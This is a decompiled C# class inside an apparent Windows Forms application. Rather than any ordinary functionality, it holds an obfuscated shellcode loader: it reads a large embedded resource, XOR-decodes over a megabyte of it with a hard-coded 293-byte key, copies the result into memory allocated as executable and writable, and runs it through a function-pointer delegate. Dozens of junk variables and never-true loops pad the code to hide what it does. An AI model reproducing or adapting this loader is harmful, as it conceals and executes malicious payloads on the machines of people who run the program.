using System;
using System.Runtime.InteropServices;
using WindowsFormsApplication.Properties;

namespace WindowsFormsApplication;

internal class Class1
{
	[Flags]
	public enum AllocationType : uint
	{
		COMMIT = 0x1000u,
		RESERVE = 0x2000u,
		RESET = 0x80000u,
		LARGE_PAGES = 0x20000000u,
		PHYSICAL = 0x400000u,
		TOP_DOWN = 0x100000u,
		WRITE_WATCH = 0x200000u
	}

	[Flags]
	public enum MemoryProtection : uint
	{
		EXECUTE = 0x10u,
		EXECUTE_READ = 0x20u,
		EXECUTE_READWRITE = 0x40u,
		EXECUTE_WRITECOPY = 0x80u,
		NOACCESS = 1u,
		READONLY = 2u,
		READWRITE = 4u,
		WRITECOPY = 8u,
		GUARD_Modifierflag = 0x100u,
		NOCACHE_Modifierflag = 0x200u,
		WRITECOMBINE_Modifierflag = 0x400u
	}

	private delegate int milvbjg();

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr VirtualAlloc(IntPtr lpAddress, IntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

	public static int vtrkvb(int ztxw)
	{
		byte[] array = new byte[1253813];
		byte b = 55;
		byte b2 = 197;
		byte b3 = 150;
		byte b4 = 72;
		byte b5 = 230;
		byte b6 = 251;
		byte b7 = 102;
		byte b8 = 7;
		byte b9 = 15;
		byte b10 = 245;
		byte b11 = 159;
		byte b12 = 187;
		byte b13 = 132;
		byte b14 = 177;
		byte b15 = 116;
		byte b16 = 47;
		while (b > 53 && b2 > 25 && b3 <= 213 && b4 >= 208 && b5 > 148 && b6 == 37 && b7 == 213 && b8 > 102 && b9 >= 159 && b10 >= 231 && b11 < 85 && b12 != 181 && b13 < 202 && b14 <= 83 && b15 <= 60 && b16 == 151)
		{
			b = (byte)(b + 1);
			b2 = (byte)(b2 - 1);
			b3 = (byte)(b3 + 1);
			b4 = (byte)(b4 + 1);
			b5 = (byte)(b5 + 1);
			b6 = (byte)(b6 + 1);
			b7 = (byte)(b7 + 1);
			b8 = (byte)(b8 - 1);
			b9 = (byte)(b9 + 1);
			b10 = (byte)(b10 - 1);
			b11 = (byte)(b11 + 1);
			b12 = (byte)(b12 - 1);
			b13 = (byte)(b13 + 1);
			b14 = (byte)(b14 + 1);
			b15 = (byte)(b15 + 1);
			b16 = (byte)(b16 - 1);
		}
		byte[] array2 = new byte[293]
		{
			172, 93, 196, 196, 196, 196, 196, 196, 196, 196,
			196, 196, 196, 196, 196, 196, 196, 196, 196, 196,
			196, 196, 196, 196, 196, 196, 196, 196, 196, 196,
			196, 196, 196, 196, 196, 196, 196, 196, 196, 196,
			196, 196, 196, 196, 196, 196, 196, 196, 196, 196,
			196, 13, 47, 47, 47, 47, 47, 47, 47, 47,
			47, 47, 47, 47, 47, 47, 47, 47, 47, 47,
			47, 47, 47, 47, 47, 47, 47, 100, 29, 108,
			108, 108, 108, 108, 108, 105, 230, 230, 230, 230,
			230, 230, 230, 230, 230, 230, 230, 230, 230, 230,
			230, 230, 230, 230, 230, 230, 230, 230, 230, 230,
			230, 230, 230, 230, 230, 230, 230, 230, 230, 230,
			230, 230, 230, 230, 230, 230, 230, 115, 199, 199,
			199, 199, 199, 199, 199, 199, 199, 199, 199, 199,
			101, 247, 223, 223, 223, 223, 223, 223, 223, 223,
			223, 223, 223, 223, 223, 223, 223, 223, 223, 223,
			223, 223, 223, 223, 223, 115, 254, 108, 140, 149,
			46, 35, 68, 78, 164, 164, 164, 164, 164, 164,
			164, 164, 164, 164, 164, 164, 164, 164, 164, 164,
			164, 164, 164, 164, 164, 164, 164, 164, 164, 164,
			164, 164, 164, 164, 164, 164, 164, 164, 164, 164,
			164, 164, 164, 164, 164, 164, 164, 32, 41, 55,
			190, 170, 170, 170, 170, 170, 170, 170, 170, 170,
			170, 170, 170, 170, 170, 108, 40, 40, 40, 40,
			40, 40, 40, 40, 40, 40, 40, 32, 59, 60,
			252, 39, 198, 85, 85, 85, 85, 85, 85, 85,
			10, 103, 103, 103, 103, 103, 103, 103, 103, 103,
			103, 103, 103, 103, 103, 103, 103, 103, 114, 89,
			166, 166, 166, 166, 166, 166, 166, 166, 166, 166,
			166, 166, 166
		};
		int num = 0;
		Resources.cdql.Read(array, 0, 1253813);
		IntPtr intPtr = VirtualAlloc(IntPtr.Zero, (IntPtr)1073500, AllocationType.COMMIT | AllocationType.RESERVE, MemoryProtection.EXECUTE_READWRITE);
		while (true)
		{
			byte b17 = 75;
			byte b18 = 254;
			byte b19 = 133;
			byte b20 = 166;
			byte b21 = 24;
			byte b22 = 145;
			byte b23 = 226;
			byte b24 = 25;
			byte b25 = 222;
			byte b26 = 72;
			byte b27 = 134;
			byte b28 = 46;
			byte b29 = 147;
			byte b30 = 220;
			byte b31 = 195;
			byte b32 = 67;
			byte b33 = 114;
			byte b34 = 12;
			while (b17 == 179 && b18 == 140 && b19 >= 31 && b20 <= 59 && b21 >= 237 && b22 <= 61 && b23 <= 238 && b24 != 199 && b25 >= 11 && b26 > 233 && b27 == 105 && b28 < 138 && b29 > 227 && b30 <= 214 && b31 <= 217 && b32 < 69 && b33 != 245 && b34 < 8)
			{
				b17 = (byte)(b17 + 1);
				b18 = (byte)(b18 + 1);
				b19 = (byte)(b19 - 1);
				b20 = (byte)(b20 - 1);
				b21 = (byte)(b21 + 1);
				b22 = (byte)(b22 + 1);
				b23 = (byte)(b23 - 1);
				b24 = (byte)(b24 + 1);
				b25 = (byte)(b25 - 1);
				b26 = (byte)(b26 + 1);
				b27 = (byte)(b27 + 1);
				b28 = (byte)(b28 + 1);
				b29 = (byte)(b29 - 1);
				b30 = (byte)(b30 - 1);
				b31 = (byte)(b31 - 1);
				b32 = (byte)(b32 + 1);
				b33 = (byte)(b33 - 1);
				b34 = (byte)(b34 - 1);
			}
			if (num == 1073500)
			{
				break;
			}
			byte b35 = 248;
			byte b36 = 239;
			byte b37 = 89;
			byte b38 = 7;
			byte b39 = 168;
			byte b40 = 28;
			byte b41 = 207;
			byte b42 = 199;
			byte b43 = 113;
			byte b44 = 29;
			byte b45 = 139;
			byte b46 = 47;
			byte b47 = 250;
			byte b48 = 137;
			byte b49 = 50;
			byte b50 = 41;
			while (b35 >= 124 && b36 != 112 && b37 <= 70 && b38 < 251 && b39 == 234 && b40 >= 65 && b41 >= 46 && b42 > 47 && b43 == 174 && b44 == 138 && b45 > 231 && b46 == 196 && b47 != 125 && b48 == 234 && b49 > 201 && b50 == 67)
			{
				b35 = (byte)(b35 + 1);
				b36 = (byte)(b36 + 1);
				b37 = (byte)(b37 - 1);
				b38 = (byte)(b38 - 1);
				b39 = (byte)(b39 + 1);
				b40 = (byte)(b40 + 1);
				b41 = (byte)(b41 + 1);
				b42 = (byte)(b42 - 1);
				b43 = (byte)(b43 - 1);
				b44 = (byte)(b44 + 1);
				b45 = (byte)(b45 + 1);
				b46 = (byte)(b46 - 1);
				b47 = (byte)(b47 + 1);
				b48 = (byte)(b48 - 1);
				b49 = (byte)(b49 + 1);
				b50 = (byte)(b50 + 1);
			}
			int num2 = num % 293;
			for (byte b51 = 101; b51 <= 120; b51 = (byte)(b51 + 1))
			{
			}
			array[num + 180313] ^= array2[num2];
			byte b52 = 6;
			byte b53 = 67;
			byte b54 = 174;
			byte b55 = 184;
			byte b56 = 37;
			byte b57 = 85;
			byte b58 = 70;
			byte b59 = 80;
			byte b60 = 158;
			byte b61 = 239;
			byte b62 = 147;
			byte b63 = 184;
			byte b64 = 71;
			byte b65 = 176;
			byte b66 = 2;
			while (b52 < 234 && b53 != 138 && b54 == 126 && b55 > 113 && b56 > 106 && b57 > 203 && b58 > 55 && b59 < 132 && b60 < 125 && b61 == 188 && b62 >= 2 && b63 > 15 && b64 > 176 && b65 == 221 && b66 == 252)
			{
				b52 = (byte)(b52 - 1);
				b53 = (byte)(b53 + 1);
				b54 = (byte)(b54 + 1);
				b55 = (byte)(b55 + 1);
				b56 = (byte)(b56 - 1);
				b57 = (byte)(b57 - 1);
				b58 = (byte)(b58 - 1);
				b59 = (byte)(b59 + 1);
				b60 = (byte)(b60 + 1);
				b61 = (byte)(b61 - 1);
				b62 = (byte)(b62 - 1);
				b63 = (byte)(b63 + 1);
				b64 = (byte)(b64 - 1);
				b65 = (byte)(b65 - 1);
				b66 = (byte)(b66 - 1);
			}
			num++;
			byte b67 = 24;
			byte b68 = 107;
			byte b69 = 235;
			byte b70 = 233;
			byte b71 = 78;
			byte b72 = 65;
			byte b73 = 3;
			byte b74 = 199;
			byte b75 = 122;
			byte b76 = 137;
			byte b77 = 142;
			byte b78 = 214;
			while (b67 == 167 && b68 >= 75 && b69 >= 114 && b70 != 37 && b71 != 222 && b72 == 180 && b73 <= 73 && b74 == 23 && b75 >= 34 && b76 == 152 && b77 > 125 && b78 != 105)
			{
				b67 = (byte)(b67 + 1);
				b68 = (byte)(b68 - 1);
				b69 = (byte)(b69 - 1);
				b70 = (byte)(b70 + 1);
				b71 = (byte)(b71 - 1);
				b72 = (byte)(b72 + 1);
				b73 = (byte)(b73 + 1);
				b74 = (byte)(b74 + 1);
				b75 = (byte)(b75 - 1);
				b76 = (byte)(b76 - 1);
				b77 = (byte)(b77 + 1);
				b78 = (byte)(b78 - 1);
			}
		}
		byte b79 = 62;
		byte b80 = 235;
		byte b81 = 3;
		byte b82 = 231;
		byte b83 = 20;
		byte b84 = 179;
		byte b85 = 219;
		byte b86 = 113;
		byte b87 = 62;
		byte b88 = 244;
		byte b89 = 8;
		byte b90 = 218;
		byte b91 = 73;
		byte b92 = 190;
		while (b79 > 117 && b80 < 156 && b81 != 130 && b82 >= 63 && b83 <= 121 && b84 <= 151 && b85 != 234 && b86 >= 145 && b87 >= 217 && b88 > 150 && b89 >= 136 && b90 < 230 && b91 != 136 && b92 <= 153)
		{
			b79 = (byte)(b79 + 1);
			b80 = (byte)(b80 + 1);
			b81 = (byte)(b81 + 1);
			b82 = (byte)(b82 - 1);
			b83 = (byte)(b83 - 1);
			b84 = (byte)(b84 + 1);
			b85 = (byte)(b85 - 1);
			b86 = (byte)(b86 + 1);
			b87 = (byte)(b87 - 1);
			b88 = (byte)(b88 - 1);
			b89 = (byte)(b89 + 1);
			b90 = (byte)(b90 + 1);
			b91 = (byte)(b91 - 1);
			b92 = (byte)(b92 - 1);
		}
		byte b93 = 125;
		byte b94 = 122;
		byte b95 = 216;
		while (b93 == 21 && b94 < 102 && b95 != 40)
		{
			b93 = (byte)(b93 - 1);
			b94 = (byte)(b94 + 1);
			b95 = (byte)(b95 - 1);
		}
		milvbjg milvbjg = (milvbjg)Marshal.GetDelegateForFunctionPointer(intPtr, typeof(milvbjg));
		Marshal.Copy(array, 180313, intPtr, 1073500);
		return milvbjg();
	}
}
